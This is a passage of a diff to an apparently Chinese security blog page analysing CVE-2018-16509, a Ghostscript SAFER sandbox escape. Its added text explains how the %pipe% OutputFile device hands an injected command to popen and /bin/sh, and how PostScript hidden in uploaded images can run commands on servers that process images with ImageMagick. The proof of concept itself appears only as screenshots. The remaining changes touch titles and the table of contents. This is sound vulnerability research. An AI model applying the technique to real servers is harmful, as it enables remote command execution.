+<p>值得一提的是，GhostScript的官方文档中提到了restore操作符存在导致绕过SAFER模式的风险。<br><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823140200.jpg" alt></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>OutputFile参数用于设置输出文件名，另外在Linux/Unix上，还可以通过设备%pipe%将输出发送到管道（Windows中也可以，需要使用两个%）。例如，要将输出通过管道传输到lpr可以使用：<code>/OutputFile (%pipe%lpr）</code>。查阅官方文档可知，%pipe%功能由popen函数支持，在调试中也能确认这一点： </p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823140435.JPG" alt></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823140448.jpg" alt></p>
+<p><code>popen()</code>函数通过创建管道的方式，调用<code>fork()</code>启动一个子进程，并将传入<code>popen()</code>的命令送到<code>/bin/sh</code>以-c参数执行。可以通过在此处注入命令实现漏洞利用，如下图中演示的那样，另外将PostScript编码到图像中，可以在使用GhostScript的Web服务器上执行任意指令（例如服务器使用ImageMagick处理上传的图像时）。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823140543.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823141418.png" alt="get shell"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">More Ghostscript Issues: Should we disable PS coders in policy.xml by default?</a><br><a href="https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf" target="_blank" rel="noopener">PostScript Language Reference(third edition)</a><br><a href="https://paper.seebug.org/68/" target="_blank" rel="noopener">PostScript语言安全研究(ImageMagick新漏洞分析</a><br><a href="https://www.ghostscript.com/doc/9.23/Language.htm" target="_blank" rel="noopener">Ghostscript官方文档</a><br><a href="https://ruxcon.org.au/assets/2017/slides/hong-ps-and-gs-ruxcon2017.pdf" target="_blank" rel="noopener">A GHOST FROM POSTSCRIPT</a></p>
 
         </div>
         <!-- 文章结尾添加版权声明 从这里开始 -->
         
         <ul class="post-copyright">
-        <li><strong>本文标题：</strong><a href="https://jontsang.github.io/post/40555.html">CVE-2018-16509：Ghostscrpt沙箱绕过漏洞</a></li>
+        <li><strong>本文标题：</strong><a href="https://jontsang.github.io/post/40555.html">CVE-2018-16509——Ghostscript沙箱逃逸漏洞</a></li>
         <li><strong>本文作者：</strong><a href="https://jontsang.github.io">Jon Tsang</a></li>
         <!-- <li><strong>本文链接：</strong><a href="https://jontsang.github.io/post/40555.html">https://jontsang.github.io/post/40555.html</a></li> -->
         <li><strong>发布时间：</strong>2018-08-23</li>
@@ -306,8 +387,8 @@
         
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/post/30788.html">
-                <span class="level-item">CVE-2016-6909——Equation Group防火墙利用工具EGREGIOUSBLUNDER分析</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/post/d4ec6e34.html">
+                <span class="level-item">CVE-2016-6909——Fortigate防火墙HTTPD栈溢出漏洞</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -353,37 +434,37 @@
                 目录
             </h3>
             <ul class="menu-list"><li>
-        <a class="is-flex" href="#一、背景">
+        <a class="is-flex" href="#环境搭建">
         <span class="has-mr-6">1</span>
-        <span>一、背景</span>
+        <span>环境搭建</span>
         </a></li><li>
-        <a class="is-flex" href="#二、漏洞细节">
+        <a class="is-flex" href="#漏洞分析">
         <span class="has-mr-6">2</span>
-        <span>二、漏洞细节</span>
+        <span>漏洞分析</span>
         </a><ul class="menu-list"><li>
-        <a class="is-flex" href="#2-1-Ghostscript安全模式（SAFER-mode）">
+        <a class="is-flex" href="#Ghostscript安全模式">
         <span class="has-mr-6">2.1</span>
-        <span>2.1 Ghostscript安全模式（SAFER mode）</span>
+        <span>Ghostscript安全模式</span>
         </a></li><li>
-        <a class="is-flex" href="#2-2-绕过SAFER沙箱">
+        <a class="is-flex" href="#PoC分析测试">
         <span class="has-mr-6">2.2</span>
-        <span>2.2 绕过SAFER沙箱</span>
+        <span>PoC分析测试</span>
         </a></li><li>
-        <a class="is-flex" href="#2-3-调试分析过程">
+        <a class="is-flex" href="#调试分析过程">
         <span class="has-mr-6">2.3</span>
-        <span>2.3 调试分析过程</span>
-        </a></li><li>
-        <a class="is-flex" href="#2-4-探究漏洞成因">
-        <span class="has-mr-6">2.4</span>
-        <span>2.4 探究漏洞成因</span>
+        <span>调试分析过程</span>
         </a></li></ul></li><li>
-        <a class="is-flex" href="#三、漏洞利用">
+        <a class="is-flex" href="#漏洞成因探究">
         <span class="has-mr-6">3</span>
-        <span>三、漏洞利用</span>
+        <span>漏洞成因探究</span>
         </a></li><li>
-        <a class="is-flex" href="#四、参考资料">
+        <a class="is-flex" href="#漏洞利用">
         <span class="has-mr-6">4</span>
-        <span>四、参考资料</span>
+        <span>漏洞利用</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考资料">
+        <span class="has-mr-6">5</span>
+        <span>参考资料</span>
         </a></li></ul>
         </div>
     </div>
@@ -407,7 +488,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞" height="28">
+                    <img src="/images/logo.svg" alt="CVE-2018-16509——Ghostscript沙箱逃逸漏洞" height="28">
                 
                 </a>
                 <p class="is-size-7">
